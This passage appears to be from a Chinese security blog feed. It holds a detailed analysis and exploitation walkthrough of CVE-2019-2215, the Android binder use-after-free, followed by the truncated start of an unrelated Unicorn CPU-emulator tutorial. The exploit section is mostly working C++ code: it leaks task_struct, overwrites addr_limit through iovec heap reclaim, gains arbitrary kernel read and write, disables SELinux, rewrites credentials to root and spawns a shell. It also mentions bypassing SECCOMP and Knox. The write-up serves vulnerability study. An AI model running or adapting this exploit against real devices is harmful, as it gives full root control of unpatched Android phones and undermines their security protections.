__list_del(entry-\u0026gt;prev, entry-\u0026gt;next); } static inline void __list_del(struct list_head * prev, struct list_head * next) { next-\u0026gt;prev = prev; //unlink操作 WRITE_ONCE(prev-\u0026gt;next, next); } 将binder_thread-\u0026gt;wait.head的指针写入binder_thread-\u0026gt;wait.head.prev和binder_thread-\u0026gt;wait.head.next。\nPoc调试分析 这里手上没有直接能用的设备，用的模拟器调试。可直接按照这个教程的配置调试。不过这个教程关闭了一些保护，使得利用要简单些，不过过程是差不多一样的。\n编译完goldfish后启动emulator -show-kernel -no-snapshot -wipe-data -avd 2019-2215 -kernel bzImage -qemu -s -S等待qemu的连接。\ngdb启动gdb -quiet vmlinux -ex 'target remote :1234' 键入c继续启动模拟器。\n等待模拟器完全启动后编译poc push进模拟器。\nbinder_thread释放之前，偏移a8处为wait.head的值，这里我们拥有内核源码以及编译好的vmliux，所以可以直接算出来wait.head相对于binder_thread地址的偏移量。\nfree之后未unlink之前binder_thread的值一样未变。\nunlink之后，binder_thread-\u0026gt;wait.head写入binder_thread-\u0026gt;wait.head.next and binder_thread-\u0026gt;wait.head.prev两个指针。\n在未开启KASan的设备上我们看不到任何奔溃。但是调试时我们能看到确实触发了漏洞。\n0x03 漏洞利用 漏洞t_thread结构体如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 struct binder_thread { struct binder_proc *proc; struct rb_node rb_node; struct list_head waiting_thread_node; int pid; int looper; /* only modified by this thread */ bool looper_need_return; /* can be written by other thread */ struct binder_transaction *transaction_stack; struct list_head todo; bool process_todo; struct binder_error return_error; struct binder_error reply_error; wait_queue_head_t wait; struct binder_stats stats; atomic_t tmp_ref; bool is_dead; struct task_struct *task; }; 注意看该结构体中有个task成员，为task_struct类型。我们首先要做的就是泄露这个结构体的地址，将它改为NULL之后，执行提权语句。下面根据exp分析整个提权的流程。\npatch addr_limit 阻止我们拿到权限的第一道关卡为task_struct结构体成员thread_info中的addr_limit（在x86_64上是直接作为task_struct的成员），用于隔离内核空间和用户空间。如果我们能控制它的值，相当于我们能完全的访问内核空间。所以第一步就是把addr_limit patch掉。\n想要patch掉addr_limit，得先泄露出task_struct的地址，再将值改为0xFFFFFFFFFFFFFFFE。后面再说为什么要改为这个值。\n这里先了解一下vectored I/O，也称为分散/聚集 I/O，是一种可以在单次系统调用中对多个缓冲区输入输出的方法，可以把多个缓冲区的数据写到单个数据流，也可以把单个数据流读到多个缓冲区中。与线性 I/O 相比，vectored I/O有一些优势：可以使用不连续的不同缓冲区进行写入或读取，而不会产生大量开销。支持原子性。使用vectored I/O可以将头部和数据保存在单独的非连续缓冲区中，并通过一个系统调用而不是两个系统调用对其进行读取或写入。\nreadv() 函数从文件描述符 fd 中读取 count 个段 (segment) (一个段即一个 iovec 结构体）到参数 iov 所指定的缓冲区中。\nwrite() 函数从参数 iov 指定的缓冲区中读取 count 个段的数据，并写入 fd 中。\n1 2 3 #include \u0026lt;sys/uio.h\u0026gt; ssize_t readv (int fd, const struct iovec *iov,vint count); ssize_t writev(int fd,const struct iovec *iov, int count); 每个 iovec 结构体描述一个独立的，物理不连续的缓冲区，我们称其为段(segment)，每个iovec结构体相对较小，在64bit系统下iovec的大小仅为0x10。\n1 2 3 4 5 struct iovec { void __user *iov_base; /* BSD uses caddr_t (1003.1g requires void *) */ __kernel_size_t iov_len; /* Must be size_t (1003.1g) */ }; 如何泄露出task_struct？看了几个exp，都用的是struct iovec去占位覆盖前面释放的binder_thread。这也是Project Zero的做法。这个方法最初是由Keen实验室提出的，iovec具有一些小特性使得它很适合用来作为攻击的媒介：\n在64bit系统下只有0x10的大小\n容易控制它的成员iov_base和iov_len。\n可以控制写入的个数控制iovec最终进入哪个kmalloc缓存\n它有一个指向缓冲区的指针和一个长度，这是使用unlink进行破坏的理想字段\n可通过readv、writev、recvmsg、sendmsg等系统调用和iovec是实现linux下的Vectored I/O。在漏洞利用中我们可以利用来绕过检查，对已释放的空间进行占位布局堆风水。\n看看exp如何如来泄露信息，作者写了很详细的注释：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 void BinderUaF::leakTaskStruct() { int pipe_fd[2] = {0}; ssize_t nBytesRead = 0; static char dataBuffer[PAGE_SIZE] = {0}; struct iovec iovecStack[IOVEC_COUNT] = {nullptr}; // Get binder fd setupBinder(); // Create event poll setupEventPoll(); // We are going to use iovec for scoped read/write, // we need to make sure that iovec stays in the kernel // before we trigger the unlink after binder_thread has // been freed. // One way to achieve this is by using the blocking APIs // in Linux kernel. Such APIs are read, write, etc on pipe. // Setup pipe for iovec INFO(\u0026#34;[+] Setting up pipe\\n\u0026#34;); if (pipe(pipe_fd) == -1) { ERR(\u0026#34;\\t[-] Unable to create pipe\\n\u0026#34;); exit(EXIT_FAILURE); } else { INFO(\u0026#34;\\t[*] Pipe created successfully\\n\u0026#34;); } // // pipe_fd[0] = read fd // pipe_fd[1] = write fd // // Default size of pipe is 65536 = 0x10000 = 64KB // This is way much of data that we care about // Let\u0026#39;s reduce the size of pipe to 0x1000 // if (fcntl(pipe_fd[0], F_SETPIPE_SZ, PAGE_SIZE) == -1) { ERR(\u0026#34;\\t[-] Unable to change the pipe capacity\\n\u0026#34;); exit(EXIT_FAILURE); } else { INFO(\u0026#34;\\t[*] Changed the pipe capacity to: 0x%x\\n\u0026#34;, PAGE_SIZE); } INFO(\u0026#34;[+] Setting up iovecs\\n\u0026#34;); // // As we are overlapping binder_thread with iovec, // binder_thread-\u0026gt;wait.lock will align to iovecStack[10].io_base. // // If binder_thread-\u0026gt;wait.lock is not 0 then the thread will get // stuck in trying to acquire the lock and the unlink operation // will not happen. // // To avoid this, we need to make sure that the overlapped data // should be set to 0. // // iovec.iov_base is a 64bit value, and spinlock_t is 32bit, so if // we can pass a valid memory address whose lower 32bit value is 0, // then we can avoid spin lock issue. // mmap4gbAlignedPage(); iovecStack[IOVEC_WQ_INDEX].iov_base = m_4gb_aligned_page; iovecStack[IOVEC_WQ_INDEX].iov_len = PAGE_SIZE; iovecStack[IOVEC_WQ_INDEX + 1].iov_base = (void *) 0x41414141; iovecStack[IOVEC_WQ_INDEX + 1].iov_len = PAGE_SIZE; // Now link the poll wait queue to binder thread wait queue linkEventPollWaitQueueToBinderThreadWaitQueue(); // // We should trigger the unlink operation when we // have the binder_thread reallocated as iovec array // // Now fork pid_t childPid = fork(); if (childPid == 0) { // // child process // There is a race window between the unlink and blocking // in writev, so sleep for a while to ensure that we are // blocking in writev before the unlink happens sleep(2); // Trigger the unlink operation on the reallocated chunk unlinkEventPollWaitQueueFromBinderThreadWaitQueue(); // // First interesting iovec will read 0x1000 bytes of data. // This is just the junk data that we are not interested in // nBytesRead = read(pipe_fd[0], dataBuffer, sizeof(dataBuffer)); if (nBytesRead != PAGE_SIZE) { ERR(\u0026#34;\\t[-] CHILD: read failed. nBytesRead: 0x%lx, expected: 0x%x\u0026#34;, nBytesRead, PAGE_SIZE); exit(EXIT_FAILURE); } exit(EXIT_SUCCESS); } // parent process // I have seen some races which hinders the reallocation. // So, now freeing the binder_thread after fork. // freeBinderThread(); // // Reallocate binder_thread as iovec array // // We need to make sure this writev call blocks // This will only happen when the pipe is already full // This print statement was ruining the reallocation, // spent a night to figure this out. Commenting the // below line. // // INFO(\u0026#34;[+] Reallocating binder_thread\\n\u0026#34;); ssize_t nBytesWritten = writev(pipe_fd[1], iovecStack, IOVEC_COUNT); // If the corruption was successful, the total bytes written // should be equal to 0x2000. This is because there are two // valid iovec and the length of each is 0x1000 if (nBytesWritten != PAGE_SIZE * 2) { ERR(\u0026#34;\\t[-] writev failed. nBytesWritten: 0x%lx, expected: 0x%x\\n\u0026#34;, nBytesWritten, PAGE_SIZE * 2); exit(EXIT_FAILURE); } else { INFO(\u0026#34;\\t[*] Wrote 0x%lx bytes\\n\u0026#34;, nBytesWritten); } // Now read the actual data from the corrupted iovec // This is the leaked data from kernel address space // and will contain the task_struct pointer nBytesRead = read(pipe_fd[0], dataBuffer, sizeof(dataBuffer)); if (nBytesRead != PAGE_SIZE) { ERR(\u0026#34;\\t[-] read failed. nBytesRead: 0x%lx, expected: 0x%x\u0026#34;, nBytesRead, PAGE_SIZE); exit(EXIT_FAILURE); } // Wait for the child process to exit wait(nullptr); m_task_struct = (struct task_struct *) *((int64_t *) (dataBuffer + TASK_STRUCT_OFFSET_IN_LEAKED_DATA)); m_pidAddress = (void *) ((int8_t *) m_task_struct + offsetof(struct task_struct, pid)); m_credAddress = (void *) ((int8_t *) m_task_struct + offsetof(struct task_struct, cred)); m_nsproxyAddress = (void *) ((int8_t *) m_task_struct + offsetof(struct task_struct, nsproxy)); INFO(\u0026#34;[+] Leaked task_struct: %p\\n\u0026#34;, m_task_struct); INFO(\u0026#34;\\t[*] \u0026amp;task_struct-\u0026gt;pid: %p\\n\u0026#34;, m_pidAddress); INFO(\u0026#34;\\t[*] \u0026amp;task_struct-\u0026gt;cred: %p\\n\u0026#34;, m_credAddress); INFO(\u0026#34;\\t[*] \u0026amp;task_struct-\u0026gt;nsproxy: %p\\n\u0026#34;, m_nsproxyAddress); } 很好理解，exp这部分首先初始化环境之后创建用于readv和writev的pipe，readv和writev函数用于在一次函数调用中读、写多个非连续缓冲区。修改pipe的size为0x1000。\n之后创建了25个iovec，放在iovecStack里面。25个是根据binder_thread和iovec的大小算出来\nIOVEC_WQ_INDEX (int) = (offsetof(struct binder_thread, wait) / sizeof(struct iovec))\nbinder_thread结构体大小为408，25个iovec大小为25*16=400，正好。计算对比binder_thread中wait.head的偏移0xA0和iovecStack的偏移iovecStack[10].iov_len匹配。\n前面动态调试时也能看到会有两个地址的值会被写入地址，这里相对应的位置为iovecStack[10].iov_len 和iovecStack[11].io_base。所以我们这里要修改iovecStack[10]的iov_len和pipe一样的大小，阻塞掉父进程的writev系统调用，再去触发unlink操作。\n这里的iovecStack[10].io_base正好对上binder_thread-\u0026gt;wait.lock，如果这个值不为0的话，后面在尝试取自旋锁锁会出问题，不进行unlink操作，这个值是32bit的，iov_base是64bit的，所以要设置对齐，使用mmap保证低32bit为0。\niovecStack[10].iov_len和iovecStack[11].iov_len设置为pipe size的大小，iovecStack[11].io_base 设置为新分配的一个地址，\n创建fork子进程进行EPOLL_CTL_DEL操作触发unlink。读出0x1000 bytes的垃圾数据恢复进程，\n父进程free掉binder_thread，调用writev系统进行阻塞，等待子进程完成。\n最后父进程在调用read读出已经被子进程覆盖了内核地址处的数据，根据偏移读出泄露的task_struct指针。\n下面这张图是Project Zero blog贴出来的流程图，方便理解整个过程。\n既然已经有task_struct指针，接下来就可以patch 掉AddrLimit。直接看exp实现。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 void BinderUaF::clobberAddrLimit() { int sock_fd[2] = {0}; ssize_t nBytesWritten = 0; struct msghdr message = {nullptr}; struct iovec iovecStack[IOVEC_COUNT] = {nullptr}; // Get binder fd setupBinder(); // Create event poll setupEventPoll(); INFO(\u0026#34;[+] Setting up socket\\n\u0026#34;); if (socketpair(AF_UNIX, SOCK_STREAM, 0, sock_fd) == -1) { ERR(\u0026#34;\\t[-] Unable to create socketpair\\n\u0026#34;); exit(EXIT_FAILURE); } else { INFO(\u0026#34;\\t[*] Socketpair created successfully\\n\u0026#34;); } // // We will just write junk data to socket so that when recvmsg // is called it process the fist valid iovec with this junk data // and then blocks and waits for the rest of the data to be received // static char junkSocketData[] = { 0x41 }; INFO(\u0026#34;[+] Writing junk data to socket\\n\u0026#34;); nBytesWritten = write(sock_fd[1], \u0026amp;junkSocketData, sizeof(junkSocketData)); if (nBytesWritten != sizeof(junkSocketData)) { ERR(\u0026#34;\\t[-] write failed. nBytesWritten: 0x%lx, expected: 0x%lx\\n\u0026#34;, nBytesWritten, sizeof(junkSocketData)); exit(EXIT_FAILURE); } // // Write junk data to the socket so that when recvmsg is // called, it process the first valid iovec with this junk // data and then blocks for the rest of the incoming socket data // INFO(\u0026#34;[+] Setting up iovecs\\n\u0026#34;); // We want to block after processing the iovec at IOVEC_WQ_INDEX, // because then, we can trigger the unlink operation and get the // next iovecs corrupted to gain scoped write. mmap4gbAlignedPage(); iovecStack[IOVEC_WQ_INDEX].iov_base = m_4gb_aligned_page; iovecStack[IOVEC_WQ_INDEX].iov_len = 1; iovecStack[IOVEC_WQ_INDEX + 1].iov_base = (void *) 0x41414141; iovecStack[IOVEC_WQ_INDEX + 1].iov_len = 0x8 + 0x8 + 0x8 + 0x8; iovecStack[IOVEC_WQ_INDEX + 2].iov_base = (void *) 0x42424242; iovecStack[IOVEC_WQ_INDEX + 2].iov_len = 0x8; // // Prepare the data buffer that will be written to socket // Setting addr_limit to 0xFFFFFFFFFFFFFFFF in arm64 // will result in crash because of a check in do_page_fault // However, x86_64 does not have this check. But it\u0026#39;s better // to set it to 0xFFFFFFFFFFFFFFFE so that this same code can // be used in arm64 as well. // static uint64_t finalSocketData[] = { 0x1, // iovecStack[IOVEC_WQ_INDEX].iov_len 0x41414141, // iovecStack[IOVEC_WQ_INDEX + 1].iov_base 0x8 + 0x8 + 0x8 + 0x8, // iovecStack[IOVEC_WQ_INDEX + 1].iov_len (uint64_t) ((uint8_t *) m_task_struct + OFFSET_TASK_STRUCT_ADDR_LIMIT), // iovecStack[IOVEC_WQ_INDEX + 2].iov_base 0xFFFFFFFFFFFFFFFE // addr_limit value }; // // Prepare the message // message.msg_iov = iovecStack; message.msg_iovlen = IOVEC_COUNT; // // Now link the poll wait queue to binder thread wait queue // linkEventPollWaitQueueToBinderThreadWaitQueue(); // // We should trigger the unlink operation when we // have the binder_thread reallocated as iovec array // Now fork pid_t childPid = fork(); if (childPid == 0) { // // child process // There is a race window between the unlink and blocking // in writev, so sleep for a while to ensure that we are // blocking in writev before the unlink happens // sleep(2); // // Trigger the unlink operation on the reallocated chunk // unlinkEventPollWaitQueueFromBinderThreadWaitQueue(); // // Now, at this point, the iovecStack[IOVEC_WQ_INDEX].iov_len // and iovecStack[IOVEC_WQ_INDEX + 1].iov_base is clobbered // // Write rest of the data to the socket so that recvmsg starts // processing the corrupted iovecs and we get scoped write and // finally arbitrary write nBytesWritten = write(sock_fd[1], finalSocketData, sizeof(finalSocketData)); if (nBytesWritten != sizeof(finalSocketData)) { ERR(\u0026#34;\\t[-] write failed. nBytesWritten: 0x%lx, expected: 0x%lx\u0026#34;, nBytesWritten, sizeof(finalSocketData)); exit(EXIT_FAILURE); } exit(EXIT_SUCCESS); } // parent process // I have seen some races which hinders the reallocation. // So, now freeing the binder_thread after fork. freeBinderThread(); // Reallocate binder_thread as iovec array and // we need to make sure this recvmsg call blocks. // recvmsg will block after processing a valid iovec at // iovecStack[IOVEC_WQ_INDEX] ssize_t nBytesReceived = recvmsg(sock_fd[0], \u0026amp;message, MSG_WAITALL); // If the corruption was successful, the total bytes received // should be equal to length of all iovec. This is because there // are three valid iovec ssize_t expectedBytesReceived = iovecStack[IOVEC_WQ_INDEX].iov_len + iovecStack[IOVEC_WQ_INDEX + 1].iov_len + iovecStack[IOVEC_WQ_INDEX + 2].iov_len; if (nBytesReceived != expectedBytesReceived) { ERR(\u0026#34;\\t[-] recvmsg failed. nBytesReceived: 0x%lx, expected: 0x%lx\\n\u0026#34;, nBytesReceived, expectedBytesReceived); exit(EXIT_FAILURE); } // Wait for the child process to exit wait(nullptr); } 这里就要将addr_limit的值改为0xFFFFFFFFFFFFFFFE在arm64里有个检查函数do_page_fault会检测该值是否为0xFFFFFFFFFFFFFFFF，如果是就触发奔溃，所以一般都设为0xFFFFFFFFFFFFFFFE。\n前面是从内核读出数据，这里要实现的是向内核写入数据。\n看看这里的iovecStack结构：\n1 2 3 4 5 6 iovecStack[IOVEC_WQ_INDEX].iov_base = m_4gb_aligned_page; iovecStack[IOVEC_WQ_INDEX].iov_len = 1; iovecStack[IOVEC_WQ_INDEX + 1].iov_base = (void *) 0x41414141; iovecStack[IOVEC_WQ_INDEX + 1].iov_len = 0x8 + 0x8 + 0x8 + 0x8; iovecStack[IOVEC_WQ_INDEX + 2].iov_base = (void *) 0x42424242; iovecStack[IOVEC_WQ_INDEX + 2].iov_len = 0x8; 和前面泄露信息的布局是差不多。\n首先依然是初始化环境，先向socket写入了1byte的垃圾数据，之后父进程使用recvmsg系统调用接收了1byte的数据之后进行阻塞，这里选用了recvmsg而不是前面writev是因为iovecStack[10].iov_len变成了一个指针，很大的数字，后续调用copy_page_to_iter_iovec复制数据时会出错。\n子进程进行unlink操作，将精心构造的finalSocketData写入socket，父进程恢复接收数据，这时iovecStack[11]已经被破坏掉了，等到recvmsg系统调用返回时，就可以修改掉addr_limit的值。\n1 2 3 4 5 6 7 8 static uint64_t finalSocketData[] = { 0x1, // iovecStack[IOVEC_WQ_INDEX].iov_len 0x41414141, // iovecStack[IOVEC_WQ_INDEX + 1].iov_base 0x8 + 0x8 + 0x8 + 0x8, // iovecStack[IOVEC_WQ_INDEX + 1].iov_len (uint64_t) ((uint8_t *) m_task_struct + OFFSET_TASK_STRUCT_ADDR_LIMIT), // iovecStack[IOVEC_WQ_INDEX + 2].iov_base 0xFFFFFFFFFFFFFFFE // addr_limit value }; 对应上面的值。\n到这里我们就有了完整的内核读写权限，接下绕过kaslr、禁用SElinux、patchCred就可以获得root权限。\nbypass kaslr and Disabling SELinux 前面已经了有了完整的读写权限，那这就很简单了。\n任意读写的实现：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 void BinderUaF::kRead(void *Address, size_t Length, void *uBuffer) { ssize_t nBytesWritten = write(m_kernel_rw_pipe_fd[1], Address, Length); if ((size_t) nBytesWritten != Length) { ERR(\u0026#34;[-] Failed to write data from kernel: %p\u0026#34;, Address); exit(EXIT_FAILURE); } ssize_t nBytesRead = read(m_kernel_rw_pipe_fd[0], uBuffer, Length); if ((size_t) nBytesRead != Length) { ERR(\u0026#34;[-] Failed to read data from kernel: %p\u0026#34;, Address); exit(EXIT_FAILURE); } } void BinderUaF::kWrite(void *Address, size_t Length, void *uBuffer) { ssize_t nBytesWritten = write(m_kernel_rw_pipe_fd[1], uBuffer, Length); if ((size_t) nBytesWritten != Length) { ERR(\u0026#34;[-] Failed to write data from user: %p\u0026#34;, Address); exit(EXIT_FAILURE); } ssize_t nBytesRead = read(m_kernel_rw_pipe_fd[0], Address, Length); if ((size_t) nBytesRead != Length) { ERR(\u0026#34;[-] Failed to write data to kernel: %p\u0026#34;, Address); exit(EXIT_FAILURE); } } 任意读的话，利用write和read两个系统调用，使用write将数据写到pipe，并在管道的另一端read一个内核地址，就可以将数据写入该内核地址。任意写的话，与之相反。这样就实现了任意读写。\ntask_struct 有一个全局指针nsproxy ，前面已经泄露出来了，就可以更具偏移直接算出Kernel_base_addr。\n1 2 3 4 5 6 7 8 9 10 11 12 13 ptrdiff_t kernelBase = nsProxy - SYMBOL_OFFSET_init_nsproxy; auto selinuxEnforcing = (void *) (kernelBase + SYMBOL_OFFSET_selinux_enforcing); INFO(\u0026#34;\\t[*] nsproxy: 0x%lx\\n\u0026#34;, nsProxy); INFO(\u0026#34;\\t[*] Kernel base: 0x%lx\\n\u0026#34;, kernelBase); INFO(\u0026#34;\\t[*] selinux_enforcing: %p\\n\u0026#34;, selinuxEnforcing); int selinuxEnabled = kReadDword(selinuxEnforcing); if (!selinuxEnabled) { INFO(\u0026#34;\\t[*] selinux enforcing is disabled\\n\u0026#34;); return; } INFO(\u0026#34;\\t[*] selinux enforcing is enabled\\n\u0026#34;); kWriteDword(selinuxEnforcing, 0x0); 这里只需要对于SELinux只需根据kernelBase 计算出具体的地址，再直接进行写入0x0即可禁用掉。\n现在的版本越来越多保护和检查机制，实际上直接这样不一定是不可行，有时得恢复kallsyms表才行\nRoot 提权的常用语句commit_creds(prepare_kernel_cred(NULL));，这就是常规的套路了。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 kWriteDword((void *) ((uint8_t *) m_cred + offsetof(struct cred, uid)), GLOBAL_ROOT_UID); kWriteDword((void *) ((uint8_t *) m_cred + offsetof(struct cred, gid)), GLOBAL_ROOT_GID); kWriteDword((void *) ((uint8_t *) m_cred + offsetof(struct cred, suid)), GLOBAL_ROOT_UID); kWriteDword((void *) ((uint8_t *) m_cred + offsetof(struct cred, sgid)), GLOBAL_ROOT_GID); kWriteDword((void *) ((uint8_t *) m_cred + offsetof(struct cred, euid)), GLOBAL_ROOT_UID); kWriteDword((void *) ((uint8_t *) m_cred + offsetof(struct cred, egid)), GLOBAL_ROOT_GID); kWriteDword((void *) ((uint8_t *) m_cred + offsetof(struct cred, fsuid)), GLOBAL_ROOT_UID); kWriteDword((void *) ((uint8_t *) m_cred + offsetof(struct cred, fsgid)), GLOBAL_ROOT_GID); kWriteDword((void *) ((uint8_t *) m_cred + offsetof(struct cred, securebits)), SECUREBITS_DEFAULT); kWriteQword((void *) ((uint8_t *) m_cred + offsetof(struct cred, cap_inheritable)), CAP_EMPTY_SET); kWriteQword((void *) ((uint8_t *) m_cred + offsetof(struct cred, cap_permitted)), CAP_FULL_SET); kWriteQword((void *) ((uint8_t *) m_cred + offsetof(struct cred, cap_effective)), CAP_FULL_SET); kWriteQword((void *) ((uint8_t *) m_cred + offsetof(struct cred, cap_bset)), CAP_FULL_SET); kWriteQword((void *) ((uint8_t *) m_cred + offsetof(struct cred, cap_ambient)), CAP_EMPTY_SET); 前面已经泄露出了task_struct-\u0026gt;cred的地址，这里就只用将事先准备好的cred结构体写入即可\n最后执行system(\u0026quot;/bin/sh\u0026quot;);、execve(\u0026quot;/system/bin/sh\u0026quot;);即可获得root权限。\nDisabling SECCOMP 额外的如果想要将提权程序捆绑到app上的还需要这一步，Android8开始，所有 Android 软件都使用系统调用与 Linux 内核进行通信，SECCOMP过滤器会检测所有的非法调用。SECCOMP过滤器是放在zygote 进程中，而所有的Android应用程序都是该进程fork出来的，按理所以会影响到所有的应用，但是Android安全团队进行了部分筛选，只会阻止某些系统调用。\n1 2 3 4 struct seccomp { int mode; struct seccomp_filter *filter; }; 想要禁用SECCOMP，直接将mode改为0是导致内核崩溃，需要清除TIF_SECCOMP 标志。这篇文章实现了绕过，感兴趣可以看一看。\n对于三星的设备，还需要绕过Knox/RKP才行。对于如何绕过，最近有人公开了s8相关的利用代码，感兴趣可以看看。\npatch patch\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 diff --git a/drivers/android/binder.c b/drivers/android/binder.c index a340766b51fe..2ef8bd29e188 100644 --- a/drivers/android/binder.c +++ b/drivers/android/binder.c @@ -4302,6 +4302,18 @@ static int binder_thread_release(struct binder_proc *proc, if (t) spin_lock(\u0026amp;t-\u0026gt;lock); } + +\t/* +\t* If this thread used poll, make sure we remove the waitqueue +\t* from any epoll data structures holding it with POLLFREE. +\t* waitqueue_active() is safe to use here because we\u0026#39;re holding +\t* the inner lock. +\t*/ +\tif ((thread-\u0026gt;looper \u0026amp; BINDER_LOOPER_STATE_POLL) \u0026amp;\u0026amp; +\twaitqueue_active(\u0026amp;thread-\u0026gt;wait)) { +\twake_up_poll(\u0026amp;thread-\u0026gt;wait, POLLHUP | POLLFREE); +\t} + binder_inner_proc_unlock(thread-\u0026gt;proc); if (send_reply) 在binder_thread free之前清理掉thread-\u0026gt;wait即可。\n总结 去年出的经典的提权漏洞，这个漏洞当做提权入门也还不错，可以学习到一个完整的提权流程和几个常见方法。\n后续真机测试过程中手上没pixel2 只能在pixel的3.18上测试，得注意先测试再使用网上的exp。然后就是适配的话主要是对于一些偏移的适配，以及不是所有的设备能都直接利用，不同内核版本和不同产商又不一样。\n提权过程中最主要注意的就是不让内核发生奇奇怪怪的奔溃，每次遇到奔溃，可能就需要想其他的方法去绕过。\n关于这个漏洞还有很多其他思路可以尝试，比如人造页表镜像攻击之类的方式。\n参考 https://www.52pojie.cn/thread-1083552-1-1.html\nhttps://blog.csdn.net/weixin_43901866/article/details/102458212\nhttps://cloudfuzz.github.io/android-kernel-exploitation/\nhttps://github.com/sharif-dev/AndroidKernelVulnerability\nhttps://hernan.de/blog/2019/10/15/tailoring-cve-2019-2215-to-achieve-root/\nhttps://dayzerosec.com/posts/analyzing-androids-cve-2019-2215-dev-binder-uaf/\n","date":"2020-06-30T00:00:00+08:00","permalink":"https://ykiko.top/p/cve-2019-2215%E5%88%86%E6%9E%90%E5%88%A9%E7%94%A8%E8%AE%B0%E5%BD%95/","title":"CVE-2019-2215分析利用记录"},{"content":"Unicorn简单学习使用记录 0x00 介绍 Unicorn是一个轻量级, 多平台, 多架构的CPU模拟器框架，基于qemu开发，它可以代替CPU模拟代码的执行，常用于恶意代码分析，Fuzz等。\n0x01 安装 官网有编译好不同平台的二进制包，直接安装就行。但是看了一下时间2017年的，qemu已经升级好几个版本了。api也比较老旧。\n去github看了一下是否有在更新，发现一直有在更新，不过好像也没更新啥，只是修复一些bug，下载git源码，自己编译。目前最新1.0.2rc\n1 2 3 4 5 6 7 8 9 git clone https://github.com/unicorn-engine/unicorn.git cd unicorn # UNICORN_ARCHS=\u0026#34;arm aarch64 x86\u0026#34; ./make.sh # 设置要编译的架构 可选 默认6种全编译 (Arm, Arm64, M68K, Mips, Sparc, \u0026amp; X86) ./make.sh sudo ./make.sh install # python 绑定 cd bindings/python sudo python3 setup.py install 还有更多交叉编译选项参考 文档\n0x02 简单使用 C :\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;unicorn/unicorn.h\u0026gt; // 要模拟的指令 #define X86_CODE32 \u0026#34;\\x41\\x4a\u0026#34; // INC ecx; DEC edx // 起始地址 #define ADDRESS 0x1000000 int main(int argc, char const *argv[]){ // 设置engine uc_engine *uc; uc_err err; //设置寄存器 int r_ecx = 0x1234; int r_edx = 0x5678; printf(\u0026#34;Emulate i386 code\\n\u0026#34;); // x86 32bit 初始化 err = uc_open(UC_ARCH_X86, UC_MODE_32, \u0026amp;uc); if (err != UC_ERR_OK){ printf(\u0026#34;Failed on uc_open() with error returned: %u\\n\u0026#34;, err); return -1; } // 给模拟器申请 2MB 内存 uc_mem_map(uc, ADDRESS, 2 * 1024 * 1024, UC_PROT_ALL); // 将要模拟的指令写入内存 if (uc_mem_write(uc, ADDRESS, X86_CODE32, sizeof(X86_CODE32) - 1)){ printf(\u0026#34;Failed to write emulation code to memory, quit!\\n\u0026#34;); return -1; } // 初始化寄存器 uc_reg_write(uc, UC_X86_REG_ECX, \u0026amp;r_ecx); uc_reg_write(uc, UC_X86_REG_EDX, \u0026amp;r_edx); printf(\u0026#34;\u0026gt;\u0026gt;\u0026gt; ECX = 0x%x\\n\u0026#34;, r_ecx); printf(\u0026#34;\u0026gt;\u0026gt;\u0026gt; EDX = 0x%x\\n\u0026#34;, r_edx); // 模拟代码 err = uc_emu_start(uc, ADDRESS, ADDRESS + sizeof(X86_CODE32) - 1, 0, 0); if (err){ printf(\u0026#34;Failed on uc_emu_start() with error returned %u: %s\\n\u0026#34;, err, uc_strerror(err)); } // 打印寄存器值 printf(\u0026#34;Emulation done. Below is the CPU context\\n\u0026#34;); uc_reg_read(uc, UC_X86_REG_ECX, \u0026amp;r_ecx); uc_reg_read(uc, UC_X86_REG_EDX, \u0026amp;r_edx); printf(\u0026#34;\u0026gt;\u0026gt;\u0026gt; ECX = 0x%x\\n\u0026#34;, r_ecx); printf(\u0026#34;\u0026gt;\u0026gt;\u0026gt; EDX = 0x%x\\n\u0026#34;, r_edx); uc_close(uc); return 0; } 官方给了很多测试案例\npython3:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 from __future__ import print_function from unicorn import * from unicorn.x86_const import * X86_CODE32 = b\u0026#34;\\x41\\x4a\u0026#34; #INC ecx; DEC edx ADDRESS = 0x1000000 print(\u0026#34;Emulate i386 code\u0026#34;) try: ## 初始化模拟器为x86 32bit mu = Uc(UC_ARCH_X86,UC_MODE_32) # mu = Uc(UC_ARCH_ARM64,UC_MODE_64) ## 2MB 的memory mu.mem_map(ADDRESS,2*1024*1024) ## mu.mem_write(ADDRESS,X86_CODE32) ## mu.reg_write(UC_X86_REG_ECX,0x1234) mu.reg_write(UC_X86_REG_EDX,0x7890) ## mu.emu_start(ADDRESS, ADDRESS + len(X86_CODE32)) print(\u0026#34;Emulation done. Below is the CPU context\u0026#34;) r_ecx = mu.reg_read(UC_X86_REG_ECX) r_edx = mu.reg_read(UC_X86_REG_EDX) print(\u0026#34;\u0026gt;\u0026gt;\u0026gt; ECX = 0x%x\u0026#34; %r_ecx) print(\u0026#34;\u0026gt;\u0026gt;\u0026gt; EDX = 0x%x\u0026#34; %r_edx) except UcError as 